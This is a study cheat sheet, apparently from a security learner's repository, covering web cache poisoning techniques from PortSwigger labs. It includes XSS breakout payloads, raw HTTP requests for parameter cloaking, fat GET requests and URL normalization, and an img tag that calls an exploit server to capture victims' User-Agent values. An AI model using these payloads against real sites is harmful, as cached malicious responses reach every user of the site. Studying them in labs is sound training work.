# Web Cache Poisoning

## Summary 

* [Recon for Web Cache Poisoning](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

* Additional Note: There is a PDF attached in this folder that has a walk-through of the labs. The document does not need to be downloaded, it can be viewed inline in GitHub.

<br><br>

## Recon 

* https://portswigger.net/web-security/web-cache-poisoning#constructing-a-web-cache-poisoning-attack

* https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#cache-probing-methodology

<br><br>

## Tools and Burp Extensions Used

* Param Miner Extension

   * https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943

   * https://portswigger.net/burp/documentation/desktop/testing-workflow/analyzing/hidden-inputs

* Using the Bup Scanner to perform a targeted scan on a request also helped to identify web cache poisoning.

<br><br>

## Cheat Sheet

### __Section:  Exploiting cache design flaws__

<br><br>

### __Web cache poisoning with an unkeyed header__

* Identify an unkeyed header that the application is using to dynamically build content in the response.  Depending on how the application is using this data, several different attacks are possible such as XSS or open redirection.

* The Burp Extension Param Miner can help to identify unkeyed headers/parameters.  Either way ensure that a “cache buster” is included in the testing payloads to prevent the test payloads from being cached for normal application request.

* Usually headers like X-Forwarded-Host are used to dynamically generate some content on the server’s response such as domains for JavaScript files.  We can use the Exploit Server in the labs to host the same file location with malicious JavaScript payload, then poison the cache so that the response points to the Exploit Server's domain.

* Exploit Server Payload:

  * File:  This should be the same path as the script location in application's response.  Example:  /resources/js/tracking.js
  
  * Body:  Include an XSS payload in there.  

* Example:

    * Application's standard "cache keyed" header:

      * Host: Lab-Domain.net
   
    * Application using "unkeyed" header to dynamically generate JS links:
    
      * X-Forwarded-Host: Exploit-Server.net

* Since the X-Forwarded-Host header is not part of the cache key, the malicious cached response will be served to all users submitting the normal HTTP request (which does not require this header to be sent).

<br><br>

### __Web cache poisoning with an unkeyed cookie__

* Identify if there are any unkeyed cookies in the request that the application is using in an unsafe way in the response.

* In a scenario where the application is taking the value of the cookie and including it within the HTML in the response, try injecting an XSS payload that will break out of the context and successfully executes.

* Use a cache buster while testing for cache poisoning.  If the response to the request is cached send a "normal" request to confirm. 

* Vulnerability Example:

```javascript
<script> data = { "data":"user-input" } </script>
```

* Injected Payload:

```javascript
"}</script><img src=x onerror=alert(1)>//
```

<br><br>

### __Web cache poisoning with multiple headers__

* Sometimes it takes manipulating multiple unkeyed headers in a request in order to get the application to use the input in an unsafe way.

* If the application redirects an HTTP request to HTTPs for any request that is sent to the application, check the following headers:

    * X-Forwarded-Host: example.com

    * X-Forwarded-Scheme: http

* The application will redirect the request to HTTPs and will use the value in the X-Forwarded-Host header as the domain in the Location response HTTP header.

   * Example:  Location: https://example.com/{whatever-path-was-in-the-request-line}

* If there is a JavaScript file endpoint in the application, this request can be poisoned so that the application grabs the malicious code from the Exploit Server.  The reason we want to use a JavaScript file endpoint, is because the requests to these files are typically automatically triggered as soon as the user loads the application and the Exploit Server can be used to host malicious code using the same file path.

    * Example: In the Exploit Server, we'll create the same file path so the application functions properly and inject malicious code from our server.

        * Normal path in app: ->   lab-domain.net/lab/source.js

        * Use same path in exploit server: ->   exploit-server.net/lab/source.js


<br><br>

### __Targeted web cache poisoning using an unknown header__

* Use Burp Extension Param Miner to identify any arbitrary unkeyed headers.

* Scenario:

* The application is using the value of an unkeyed header inside of a “src” attribute in a \<script\> tag, as the domain value.

* The application’s response includes the header:  Vary: User-Agent

* This means that the application is using the User-Agent header as a keyed header and based on the value of it, will return different responses.  For example, mobile users vs desktop users may have different User-Agents and a different response will be served.

* In order to figure out a user’s User-Agent value that is most visited in the application, find an XSS vulnerability in the application and include a payload that will reach out to the Exploit Server, then review the logs to determine the victim user's User Agent value:

    * Example:

```html
<img src="https://exploit-server" />
```

* Once the User-Agent is grabbed from the logs for a victim user that was attacked with the XSS, use the following headers to poison the cache for example. Note:  The X-Host header was identified by the Param Miner extension:

    * X-Host:  example.com

    * User-Agent: victim-user’s-value

* Because the User-Agent header is "keyed", whenever a user with that same User-Agent makes a request to the application, the malicious response will be served back to them.

* Use the Exploit Server to host malicious XSS payload using the same file path as the "X-Host" is being injected to.

<br><br>

### __Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria__

* View the lab/document details. - https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria

<br><br><br>

### __Section: Exploiting cache implementation flaws__

<br><br>

### __Web cache poisoning via an unkeyed query string__

* An arbitrary query parameter is unkeyed.  Usually, any values in the request line are keyed, however many websites and CDNs perform various transformations on keyed components when they are saved in the cache key, such as removing query parameters/strings.

    * Example:  The query parameter is dynamically included in the HTML response - ?test=123

* Inject an XSS payload in the parameter and since it is an unkeyed parameter, the cache will be poisoned with the malicious response.

* Verify that the parameter is not part of the cache key by removing it and sending the request, if the response still contains the parameter's data we know that it was cached and not part of the cache key.

* Use Param Miner to help identify unkeyed parameters:

    * Extensions -> Param Miner -> Param Miner -> Unkeyed param 

<br><br>

### __Web cache poisoning via an unkeyed query parameter__

* Sometimes only specific query parameters are unkeyed and to discover them requires fuzzing for unkeyed parameters.

* For example, the “utm_content” parameter is unkeyed and the application is using the data in an unsafe way in the HTTP response.  This vector can be used to perform an XSS attack.  Use a valid XSS payload that breaks out of the current context so that it successfully executes.

* Param Miner can help identify these headers. Extensions -> Param Miner -> Guess params -> Guess GET Parameters

* Use the following header in the request to potential gain access to the cache key:

    * Pragma: x-get-cache-key 


<br><br>

### __Parameter cloaking__

* This concept takes advantage of the parsing discrepancies between the cache and the application. Identify an excluded parameter from the cache by using the Burp scanner or Param Miner extension.

* Below are some examples to exploit these discrepancies:

* Cache identifies 2 parameters here, and excludes the 2nd one from the cache key.
    
* Application identifies only 1 parameter here, so the entire String is processed.  Identify if this String/value is passed to useful gadget.
    
```
GET /?example=123?excluded_param=bad-stuff-here
```

<br>

  * Cache identifies 2 parameters here and will remove the "excluded_param" and everything after from the cache key.

  * Application however see's 3 parameters and will process the last "keyed_param".  Identify if this String/value is passed to useful gadget.

```
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
```

* Review this concept using the lab material and document.

* Link:  https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#cache-parameter-cloaking

* The exploitation for this was using a request for some .js file, keep that in mind.
  

<br><br>

### __Web cache poisoning via a fat GET request__

* The application is using a query parameter in an unsafe way in the HTTP response; however, this query parameter is keyed.

* Try including the same parameter in the body of the GET request = FAT GET Request

* The application may grab the value of the body parameter, and since the "body" parameter is not part of the cache key, the cache will be poisoned with malicious data.

* Example:

   * URL query parameter part of the cache key:  ?test=123

   * Body parameter NOT part of the cache key:  test=123

* The exploitation for this was using a request for some .js file, keep that in mind.

* In order for this technique to work, the application must accept GET requests that contain a body.  However below is a work around to override the HTTP method:

```
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param=bad-stuff-here
```

<br><br>

### __URL normalization__

* Browsers usually automatically encode special characters in the URL.  If the application is reflecting the URL within an HTML context, this can be a vector for XSS.  However, since the application is not decoding the URL, the payload will not execute, as it will still be in its encoded form.

* However, this can be bypassed using Burp Suite directly to send the XSS payload in the URL.  If the application is caching this response, then sending this URL to victim users will still cause the browser to encode the URL, but after URL normalization the malicious cached response will be served to the victim user. Basically the 2 requests will be treated as the same cache key, so the malicious response will be returned.

* This is a vector that is usually not exploitable by itself since the browsers URL encode the data and the application doesn't decode it.  But with cache poisoning it can be exploited.

* Basically sending the following payload through Burp Suite, will cause the application to reflect the unencoded payload which will be executed and also cached:

```
GET /<script>alert(1)</script>
```

<br><br><br>

### Pending to complete labs that are missing from this cheat sheet

* LAB EXPERT Combining web cache poisoning vulnerabilities 

* LAB EXPERT Cache key injection

* LAB EXPERT Internal cache poisoning 
